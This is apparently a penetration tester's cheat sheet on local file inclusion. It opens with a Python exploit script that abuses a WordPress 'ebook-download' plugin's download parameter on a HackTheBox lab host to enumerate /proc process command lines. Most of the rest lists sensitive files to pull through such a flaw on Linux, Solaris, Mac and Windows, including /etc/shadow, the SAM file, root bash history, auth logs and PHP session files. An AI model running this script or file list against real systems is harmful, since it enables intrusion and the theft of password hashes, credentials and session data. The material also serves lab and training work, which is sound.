# Local File Inclusion
#lfi


## List running processes
```
import requests


for num in range(0, 1001):
    url = 'http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/{}/cmdline'.format(num)
    # print(url)
    r = requests.get(url)
	# Filter - adjust as necessary!
    if not 'cmdline<script>'.encode('UTF-8') in r.content:
        print(r.content)
```

## File list
- Fingerprinting (General files)

    /etc/passwd
    /etc/master.passwd
    /etc/shadow
    /var/db/shadow/hash
    /etc/group
    /etc/hosts
    /etc/motd
    /etc/issue
    /etc/release
    /etc/redhat-release
    /etc/crontab
    /etc/inittab
    /proc/version
    /proc/cmdline
    /proc/self/environ
    /proc/self/fd/0
    /proc/self/fd/1
    /proc/self/fd/2
    /proc/self/fd/255
    /etc/httpd.conf
    /etc/apache2.conf
    /etc/apache2/apache2.conf
    /etc/apache2/httpd.conf
    /etc/httpd/conf/httpd.conf
    /etc/httpd/httpd.conf
    /etc/apache2/conf/httpd.conf
    /etc/apache/conf/httpd.conf
    /usr/local/apache2/conf/httpd.conf
    /usr/local/apache/conf/httpd.conf
    /etc/apache2/sites-enabled/000-default
	/etc/apache2/sites-enabled/000-default.conf
    /etc/apache2/sites-available/default
    /etc/nginx.conf
    /etc/nginx/nginx.conf
    /etc/nginx/sites-available/default
    /etc/nginx/sites-enabled/default
    /etc/ssh/sshd_config
    /etc/my.cnf
    /etc/mysql/my.cnf
    /etc/php.ini
    /var/mail/www-data
    /var/mail/www
    /var/mail/apache
    /var/mail/nobody
    /var/www/.bash_history
    /root/.bash_history
    /var/root/.bash_history
    /var/root/.sh_history

- Less common paths for httpd.conf/php.ini

    /usr/local/apache/httpd.conf
    /usr/local/apache2/httpd.conf
    /usr/local/httpd/conf/httpd.conf
    /usr/local/etc/apache/conf/httpd.conf
    /usr/local/etc/apache2/conf/httpd.conf
    /usr/local/etc/httpd/conf/httpd.conf
    /usr/apache2/conf/httpd.conf
    /usr/apache/conf/httpd.conf
    /etc/http/conf/httpd.conf
    /etc/http/httpd.conf
    /opt/apache/conf/httpd.conf
    /opt/apache2/conf/httpd.conf
    /var/www/conf/httpd.conf
    /usr/local/php/httpd.conf
    /usr/local/php4/httpd.conf
    /usr/local/php5/httpd.conf
    /etc/httpd/php.ini
    /usr/lib/php.ini
    /usr/lib/php/php.ini
    /usr/local/etc/php.ini
    /usr/local/lib/php.ini
    /usr/local/php/lib/php.ini
    /usr/local/php4/lib/php.ini
    /usr/local/php5/lib/php.ini
    /usr/local/apache/conf/php.ini
    /etc/php4/apache/php.ini
    /etc/php4/apache2/php.ini
    /etc/php5/apache/php.ini
    /etc/php5/apache2/php.ini
    /etc/php/php.ini
    /etc/php/php4/php.ini
    /etc/php/apache/php.ini
    /etc/php/apache2/php.ini
    /usr/local/Zend/etc/php.ini
    /opt/xampp/etc/php.ini
    /var/local/www/conf/php.ini
    /etc/php/cgi/php.ini
    /etc/php4/cgi/php.ini
    /etc/php5/cgi/php.ini

- OS Logs

Linux

    /var/log/lastlog
    /var/log/wtmp
    /var/run/utmp
    /var/log/messages.log
    /var/log/messages
    /var/log/messages.0
    /var/log/messages.0.gz
    /var/log/messages.1
    /var/log/messages.1.gz
    /var/log/messages.2
    /var/log/messages.2.gz
    /var/log/messages.3
    /var/log/messages.3.gz
    /var/log/syslog.log
    /var/log/syslog
    /var/log/syslog.0
    /var/log/syslog.0.gz
    /var/log/syslog.1
    /var/log/syslog.1.gz
    /var/log/syslog.2
    /var/log/syslog.2.gz
    /var/log/syslog.3
    /var/log/syslog.3.gz
    /var/log/auth.log
    /var/log/auth.log.0
    /var/log/auth.log.0.gz
    /var/log/auth.log.1
    /var/log/auth.log.1.gz
    /var/log/auth.log.2
    /var/log/auth.log.2.gz
    /var/log/auth.log.3
    /var/log/auth.log.3.gz

Solaris

    /var/log/authlog
    /var/log/syslog
    /var/adm/lastlog
    /var/adm/messages
    /var/adm/messages.0
    /var/adm/messages.1
    /var/adm/messages.2
    /var/adm/messages.3
    /var/adm/utmpx
    /var/adm/wtmpx

Mac

    /var/log/kernel.log
    /var/log/secure.log
    /var/log/mail.log
    /var/run/utmp
    /var/log/wtmp
    /var/log/lastlog

- HTTPD Logs

    /var/log/access.log
    /var/log/access_log
    /var/log/error.log
    /var/log/error_log
    /var/log/apache2/access.log
    /var/log/apache2/access_log
    /var/log/apache2/error.log
    /var/log/apache2/error_log
    /var/log/apache/access.log
    /var/log/apache/access_log
    /var/log/apache/error.log
    /var/log/apache/error_log
    /var/log/httpd/access.log
    /var/log/httpd/access_log
    /var/log/httpd/error.log
    /var/log/httpd/error_log
    /etc/httpd/logs/access.log
    /etc/httpd/logs/access_log
    /etc/httpd/logs/error.log
    /etc/httpd/logs/error_log
    /usr/local/apache/logs/access.log
    /usr/local/apache/logs/access_log
    /usr/local/apache/logs/error.log
    /usr/local/apache/logs/error_log
    /usr/local/apache2/logs/access.log
    /usr/local/apache2/logs/access_log
    /usr/local/apache2/logs/error.log
    /usr/local/apache2/logs/error_log
    /var/www/logs/access.log
    /var/www/logs/access_log
    /var/www/logs/error.log
    /var/www/logs/error_log
    /opt/lampp/logs/access.log
    /opt/lampp/logs/access_log
    /opt/lampp/logs/error.log
    /opt/lampp/logs/error_log
    /opt/xampp/logs/access.log
    /opt/xampp/logs/access_log
    /opt/xampp/logs/error.log
    /opt/xampp/logs/error_log

- PHP Session Locations

    /tmp/sess_<sessid>
    /var/lib/php/session/sess_<sessid>
    /var/lib/php5/session/sess_<sessid>

Windows files
- Fingerprinting

    *:\boot.ini
    *:\WINDOWS\win.ini
    *:\WINNT\win.ini
    *:\WINDOWS\Repair\SAM
    *:\WINDOWS\php.ini
    *:\WINNT\php.ini
    *:\Program Files\Apache Group\Apache\conf\httpd.conf
    *:\Program Files\Apache Group\Apache2\conf\httpd.conf
    *:\Program Files\xampp\apache\conf\httpd.conf
    *:\php\php.ini
    *:\php5\php.ini
    *:\php4\php.ini
    *:\apache\php\php.ini
    *:\xampp\apache\bin\php.ini
    *:\home2\bin\stable\apache\php.ini
    *:\home\bin\stable\apache\php.ini

- Logs

    *:\Program Files\Apache Group\Apache\logs\access.log
    *:\Program Files\Apache Group\Apache\logs\error.log

- PHP Session Locations

    *:\WINDOWS\TEMP\
    *:\php\sessions\
    *:\php5\sessions\
    *:\php4\sessions\